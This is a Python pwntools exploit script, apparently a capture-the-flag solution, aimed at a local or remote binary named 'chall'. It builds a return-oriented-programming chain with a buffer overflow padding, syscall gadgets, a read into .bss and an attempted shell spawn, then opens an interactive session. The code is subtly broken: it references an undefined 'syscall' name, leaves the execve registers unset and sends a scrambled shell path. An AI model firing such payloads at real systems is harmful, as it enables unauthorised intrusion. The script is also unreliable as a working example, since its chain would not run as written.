import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

elf = ELF("chall")

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###
pop_rdi = 0x000000000040142b
pop_rsi_r15 = 0x0000000000401429
pop_rdx_r13 = 0x0000000000401164
pop_rax = 0x0000000000401162
syscall_ret = 0x0000000000401168

bss_writable = 0x0000000000403418 + 0x200


    ###main###
def main():
    ###payload###
    payload = b"A" * 216
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(pop_rsi_r15)
    payload += p64(bss_writable)
    payload += b"BBBBBBBB"
    payload += p64(pop_rdx_r13)
    payload += p64(8)
    payload += b"CCCCCCCC"
    payload += p64(pop_rax)
    payload += p64(0)
    payload += p64(syscall)

    payload += p64(pop_rdi)
    payload += p64(bss_writable)
    payload += p64(syscall)
    

    _ = target.recvuntil("Please dont hack me")
    target.sendline(payload)
    target.sendline(b"/ova/fu\x00")
    #ret = target.recvline()
    #print(ret)
    
    target.interactive()
    

if __name__ == "__main__":
    main()
